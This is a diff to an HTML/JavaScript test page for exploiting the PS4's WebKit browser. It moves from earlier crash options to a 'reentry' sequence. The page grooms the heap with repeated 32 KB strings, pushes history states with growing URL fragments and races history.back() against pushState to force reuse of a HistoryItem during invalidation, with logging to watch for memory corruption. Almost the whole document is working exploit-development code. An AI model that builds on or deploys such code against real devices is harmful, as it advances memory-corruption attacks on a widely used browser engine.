@@ -2,116 +2,160 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – History Exploitation Base</title>
-
+<title>PS4 WebKit – Reentry Path</title>
+<style>
+body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
+button { 
+  display: block; 
+  margin: 10px 0; 
+  padding: 12px 20px; 
+  background: #2a2a2a; 
+  color: #0f0; 
+  border: 1px solid #0f0;
+  cursor: pointer;
+  font-size: 14px;
+}
+button:hover { background: #3a3a3a; }
+#log { 
+  margin-top: 20px; 
+  white-space: pre-wrap; 
+  font-size: 12px;
+  border-top: 1px solid #0f0;
+  padding-top: 10px;
+}
+.critical { color: #ff0; }
+.success { color: #0ff; }
+</style>
 </head>
-
 <body>
-<h2>PS4 WebKit – History.pushState Exploitation Base</h2>
-
-<button onclick="runOptionA()">OPTION A – Control (no crash)</button>
-<button onclick="runOptionB()">OPTION B – Boundary (49 + partial)</button>
-<button onclick="runOptionC()">OPTION C – REAL PRESSURE (expected crash)</button>
-
+<h2>PS4 WebKit – Reentry Exploitation Path</h2>
+<button onclick="runBaseline()">BASELINE – Normal (crash at ITER 48)</button>
+<button onclick="runReentry()">OPTION D – REENTRY (expected different behavior)</button>
 <div id="log"></div>
 
 <script>
 const logEl = document.getElementById("log");
-function log(m){ logEl.textContent += m + "\n"; }
+function log(m, cls=""){ 
+  const span = document.createElement("span");
+  if(cls) span.className = cls;
+  span.textContent = m + "\n";
+  logEl.appendChild(span);
+}
 function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
 
 const BASE = 977;
 const STEP = 14461;
-const ITERS = 50;
+const CRITICAL_ITER = 48; // Known crash point
 
-// Grooming persistente (CRÍTICO)
+// Grooming
 let heap = [];
 
-// Estado reaproveitado
-let sharedState = { i: 0, p: "" };
+// Popstate observer
+let popstateCount = 0;
+window.addEventListener("popstate", (e) => {
+  popstateCount++;
+  log(`[POPSTATE #${popstateCount}] state=${JSON.stringify(e.state)?.slice(0,50)}`, "success");
+});
 
 // -------------------------------------------------
-// CORE HISTORY SEQUENCE
+// BASELINE – Reproduce known crash
 // -------------------------------------------------
-async function historySequence(iterations, mode){
-    let size = BASE;
-
-    for(let i=0;i<iterations;i++){
-        sharedState.i = i;
-        sharedState.p = "A".repeat(size);
-
-        // Grooming cumulativo real
-        heap.push("G".repeat(32768)); // 32 KB por iteração
-
-        log(`[ITER ${i}] size=${size}`);
-
-        if(mode !== "C"){
-            history.pushState({}, "", "#"+sharedState.p);
-            history.replaceState({}, "", "#"+sharedState.p.slice(0, size >> 1));
-        } else {
-            // MODO REAL: mesmo objeto, mutação in-place
-            history.pushState(sharedState, "", "#"+sharedState.p);
-            history.replaceState(sharedState, "", "#"+sharedState.p);
-        }
-
-        if(i % 6 === 0){
-            setTimeout(()=>history.back(),0);
-            log("  history.back (async)");
-        }
-
-        size += STEP;
-
-        // Yield mínimo APENAS para log
-        await sleep(3);
+async function runBaseline(){
+  logEl.textContent = "";
+  popstateCount = 0;
+  heap = [];
+  log("=== BASELINE START ===");
+  log("Expected crash at ITER 48");
+  
+  let size = BASE;
+  for(let i=0; i<50; i++){
+    heap.push("G".repeat(32768));
+    const fragment = "A".repeat(size);
+    
+    log(`[ITER ${i}] size=${size}`);
+    
+    history.pushState({iter:i}, "", "#"+fragment);
+    history.replaceState({iter:i}, "", "#"+fragment);
+    
+    if(i % 6 === 0){
+      setTimeout(()=>history.back(), 0);
+      log("  → back() scheduled");
     }
+    
+    size += STEP;
+    await sleep(3);
+  }
+  
+  log("=== BASELINE END (if reached) ===");
 }
 
 // -------------------------------------------------
-// OPTION A – Controle
+// OPTION D – REENTRY PATH
 // -------------------------------------------------
-async function runOptionA(){
-    logEl.textContent = "";
-    log("=== OPTION A START ===");
-
-    await historySequence(49, "A");
-
-    log("[A] Sequence done, post-usage");
-    let arr = [];
-    for(let i=0;i<40;i++) arr.push("X".repeat(256));
-
-    log("=== OPTION A END (expected no crash) ===");
+async function runReentry(){
+  logEl.textContent = "";
+  popstateCount = 0;
+  heap = [];
+  log("=== OPTION D – REENTRY START ===", "critical");
+  log("Strategy: Force HistoryItem reuse during invalidation");
+  
+  let size = BASE;
+  
+  // Phase 1: Build up to critical point (ITER 47)
+  for(let i=0; i<CRITICAL_ITER-1; i++){
+    heap.push("G".repeat(32768));
+    const fragment = "A".repeat(size);
+    
+    log(`[BUILD ${i}] size=${size}`);
+    history.pushState({phase:"build", iter:i}, "", "#"+fragment);
+    
+    if(i % 6 === 0){
+      setTimeout(()=>history.back(), 0);
+    }
+    
+    size += STEP;
+    await sleep(3);
+  }
+  
+  log(">>> ENTERING REENTRY SEQUENCE <<<", "critical");
+  await sleep(50); // Let pending backs settle
+  
+  // Phase 2: REENTRY SEQUENCE at critical size
+  const criticalSize = BASE + STEP * (CRITICAL_ITER-1);
+  const fragment1 = "X".repeat(criticalSize);
+  const fragment2 = "Y".repeat(criticalSize);
+  
+  log(`[REENTRY] Step 1: pushState (X×${criticalSize})`);
+  history.pushState({phase:"reentry", step:1}, "", "#"+fragment1);
+  
+  log(`[REENTRY] Step 2: schedule back()`);
+  setTimeout(() => {
+    log("  → back() EXECUTING", "critical");
+    history.back();
+  }, 0);
+  
+  await sleep(5); // Minimal delay
+  
+  log(`[REENTRY] Step 3: IMMEDIATE pushState (Y×${criticalSize})`, "critical");
+  history.pushState({phase:"reentry", step:3}, "", "#"+fragment2);
+  
+  await sleep(100);
+  
+  log(">>> POST-REENTRY OBSERVATION <<<", "success");
+  log(`Popstate events received: ${popstateCount}`);
+  log(`Current fragment length: ${location.hash.length}`);
+  log(`Current fragment first char: ${location.hash[1] || 'none'}`);
+  
+  // Phase 3: Trigger with another back
+  log(`[TRIGGER] Final back() to observe behavior`, "critical");
+  await sleep(50);
+  history.back();
+  
+  await sleep(200);
+  log("=== OPTION D END (if reached) ===");
 }
 
-// -------------------------------------------------
-// OPTION B – Boundary
-// -------------------------------------------------
-async function runOptionB(){
-    logEl.textContent = "";
-    log("=== OPTION B START ===");
-
-    await historySequence(49, "B");
-
-    log("[B] Partial extra push");
-    history.pushState({}, "", "#"+"B".repeat(BASE + STEP*49));
-
-    log("=== OPTION B END ===");
-}
-
-// -------------------------------------------------
-// OPTION C – REAL PRESSURE PATH
-// -------------------------------------------------
-async function runOptionC(){
-    logEl.textContent = "";
-    log("=== OPTION C START ===");
-    log("Expected: freeze/crash around ITER 43–49");
-
-    await historySequence(ITERS, "C");
-
-    log("=== OPTION C END (if reached) ===");
-}
-
-log("Ready.");
+log("Ready. Run BASELINE first to confirm crash, then OPTION D.");
 </script>
 </body>
 </html>
-
